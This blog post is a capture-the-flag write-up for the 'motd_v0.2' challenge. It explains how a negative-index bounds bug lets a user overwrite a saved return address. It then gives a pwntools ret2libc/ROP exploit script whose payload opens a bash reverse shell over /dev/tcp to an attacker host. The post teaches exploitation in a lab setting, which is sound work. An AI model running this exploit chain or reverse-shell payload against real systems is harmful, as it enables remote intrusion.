---
title: 'Montrehack Writeups: motd_v0.2'
date: '2019-04-20 12:50:38'
tags:
 - Security
 - CTF
 - Montrehack
---

## Introduction

Last time I blogged about the [solution][1] to my challenge `motd_v.01`. I
mentioned that the solutions to the second and third binaries would follow
shortly. As life has it, I got caught up in other things and did not get a
chance to sit down to write these blogs, but now I finally do, so here it goes.

This post will cover `motd_v0.2` and the intended solution. If you have another
solution, I'd be happy to hear about it!

The code, binaries and full solutions can be [found here][src] for people who
would like to follow along.

Without any further ado, let's get started.


[1]: https://segfault.me/2019/03/03/montrehack-writeups-motd-v0-1/ "Previous Writeup"
[src]: https://github.com/alxbl/montrehack-rop101 "ROP 101: Sources & Solutions"


## Phase 1 - Reconaissance

Like the previous challenge, this starts off in a similar way: Figure out what
kind of binary we're looking at.

```bash
$ file motd_v0.2
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
BuildID[sha1]=b500eeaef0d401c62b600a2fa254faabe21577e0, not stripped


$ checksec -f motd_v0.2
RELRO         STACK CANARY    NX         PIE    RPATH    RUNPATH    Symbols    FORTIFY Fortified Fortifiable  FILE
Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 87 Symbols No       0        6       motd_v0.2
```

The first difference from the previous challenge is that this time around, the
binary is now dynamically linked. What this effectively means is that the
system's GLIBC will be loaded at runtime instead of being included directly in
the binary, greatly reducing the code size and the amount of available gadgets
to build a ROP chain.

Using `readelf`, it's possible to identify which imports are required by the
binary. These imports are located in a structure called the Procedure Linkage
Table, which, thanks to [partia RELRO][ref-relro] will not move around in the
binary, allowing our exploit code to jump directly to PLT entries.

```bash
$ readelf -s motd_v0.2 | grep -i glibc
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND putchar@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5 (2)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getchar@GLIBC_2.2.5 (2)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.2.5 (2)
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@GLIBC_2.2.5 (2)
    # [...]
```

Unfortunately, the address of the functions are all zeroes. This normal and it
is due to the fact that the function will be resolved at runtime when the
function is called for the first time. This is known as [lazy
loading][ref-loader] and is a commonly used technique in dynamically linked
binaries.


[ref-relro]: https://ctf101.org/binary-exploitation/relocation-read-only/ "CTF101: Relocate Read-Only Segments"
[ref-loader]: https://www.iecc.com/linker/linker10.html "Dynamic Linking"

## Phase 2 - Finding the Vulnerability

Enough peeking around statically, though, it's time to find out what's new in
v0.2! Running the program, we are greeted by the following:

```

motd daemon v0.2 (c) 2019 BetterSoft
Sat Apr 20 13:15:07 EDT 2019

=> How may I help you today?
    1 - View message of the day
    2 - Change message of the day
    3 - Rate message of the day
    4 - Exit
> 1

=> Which message of the day? (1-3)
> 1
=> <no message of the day set>
   Rated 0 out of 10

=> How may I help you today?
    1 - View message of the day
    2 - Change message of the day
    3 - Rate message of the day
    4 - Exit
> 3

=> Which message of the day? (1-3)
> 1
=> <no message of the day set>
 Rating? (out of 10)
> 5
Thank you! Your opinion matters to us.

=> How may I help you today?
    1 - View message of the day
    2 - Change message of the day
    3 - Rate message of the day
    4 - Exit
> 1

=> Which message of the day? (1-3)
> 1
=> <no message of the day set>
   Rated 5 out of 10

=> How may I help you today?
    1 - View message of the day
    2 - Change message of the day
    3 - Rate message of the day
    4 - Exit
> 4

Bye!
```

It looks like the program now supports multiple messages of the day and even
allows to rate the message. The newly added functionality is as follows:

* Index memory by selecting a message of the day.
* Read/Write a number at the indexed memory.

Quickly checking the `motd` update function reveals that the call to `gets` has
been patched and that the buffer size looks to be properly validated, making it
impossible to smash the stack.

![Patched read_motd](read_motd.png)

Because this is a CTF challenge, it is easy to conjecture (accurately) that the
only write primitive that's left (rating) must somehow be the key to the
kingdom. With that in mind, taking a peek at how rating works turns out to be
partially revealing:

![CFG for rate_motd](rate_motd.png)

In the function, `var_18h` holds the first argument of `rate_motd`, which
appears to be a pointer to some structure. The first red box with steps `(1)`
and `(2)` shows the function `get_motd` being called, which can be seen in the
next screenshot. Suffice to say that this function returns a pointer to the
select `motd`, which is stored on the stack in a local I aptly named
`selected_motd`.

The second red box shows steps `(3)` and `(4)` which respectively consist of
retrieving the pointer stored in `selected_motd` and storing the retrieved
rating at offset `0x8` inside the structure pointed to.

In other words, offset `+8` in the `motd` structure is the rating field.

![CFG for get_motd](get_motd.png)

The `get_motd` function also receives a pointer to the `motd` structure, and
reveals even further information about its layout. Indeed, what this function
does is prompt the user to pick a message of the day index at `(1)` and then
validates it (incorrectly) to be lesser or equal to `3` (`(2)`). If the
validation check passes, block `0x40127e [of]` shows that the index is used on
`arg1` (`var_18h`) to compute the index in what is now obviously an array of
`motd` entries. This incorrect bound check allows for negative indexing into the
array.

With a bit more digging, the array is coming from the `main` function and
appears to be located on the stack.

To summarize what we know so far:
1. It is possible to provide a negative index into the `motd` array.
2. It is possible to write at `*motd+8`, an arbitrary 8 byte value
3. The motd message array is stored on the stack

A little bit more reversing shows that the motd struct size is 16 bytes, and
that because of the stack layout, `*motd+8` maps directly on top of the stored
stack base pointer and return address:

    STACK LAYOUT

    < 0xfffffffffff >
    |     . . .     |
    |== main =======|
    |  return_addr  |
    |  old rbp      |
    |---------------|
    | motd[2]->rate |
    | motd[2]->text |
    | motd[1]->rate |
    | motd[1]->text |
    | motd[0]->rate | (+8)
    | motd[0]->text | (+0)
    |== get_motd ===|
    | return_addr   | <-- motd[-1]->rate
    | old rbp       | <-- motd[-1]->text
    |---------------|`
    |     . . .     |
    < 0x00000000000 >

**Objective:** Use the `ret2libc` technique to execute one of the `motd`
text. This time, however, there's one obstacle: `$rdi` does not contain a
pointer to a text buffer.

## Phase 4 - Building the Exploit

The first step to successful exploitation is to find a way to populate `$rdi`
with the address of a `motd[i]->text`. This requires a gadget that will pop from
the stack and into `$rdi`... finding it is simply a matter of using
[ropgadget][ref-ropgadget] on the file and filtering for `pop rdi` instructions.
It's important to note that had PIE been enabled, [address space layout
randomization][ref-aslr] would have made it more difficult than just hardcoding
the gadget address.

```python
#!/usr/bin/env python
from pwn import *
from struct import pack
def q(addr): return pack('<Q', addr)

REMOTE = ('ctf.segfault.me', 3002)
LHOST  = "10.0.0.105"
LPORT  = "8888"

RDI    = 0x4017b3 # pop rdi; ret
SYSTEM = 0x401652 # call system
PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
# PAYLOAD = "cat ~/flag.txt; exit\x00"

p = remote(*REMOTE)

# Set motd to the system() command
p.sendline("2")
p.sendline("1")
p.sendline(PAYLOAD)

# Set rating to &system
p.sendline("3")
p.sendline("1")
p.sendline(str(SYSTEM))

# Set return address to gadget chain
p.sendline("3")
p.sendline("0")
p.sendline(str(RDI))

# The program recovers because we return right after `call system()` => exit.
p.sendline("4")
print(p.readall())
```

[ref-ropgadget]: https://github.com/JonathanSalwan/ROPgadget "ROPGadget on Github"
[ref-aslr]: https://en.wikipedia.org/wiki/Address_space_layout_randomization "ASLR on Wikipedia"

## Conclusion

This challenge's purpose was to further solidify the concept of `ret2libc` and
introduce gadgets without too much added work. A simple, straight forward gadget
without any preventive measures allowed for a smooth introduction of the
technique and tools required for modern ROP exploitation.

### Resources

* [Montrehack Workshop: Slides and Presentation (Video)][presentation]
* [Montrehack Workshop: Solutions for challenge 1 & 2 (Video)][solutions]
* [Slides on Github][slides]

[presentation]: https://www.twitch.tv/videos/384854978 "Presentation of Slides"
[solutions]: https://www.twitch.tv/videos/384854977 "Presentation of Solutions"
[slides]: https://github.com/alxbl/montrehack-rop101/blob/master/slides_final.pdf "Slides PDF"

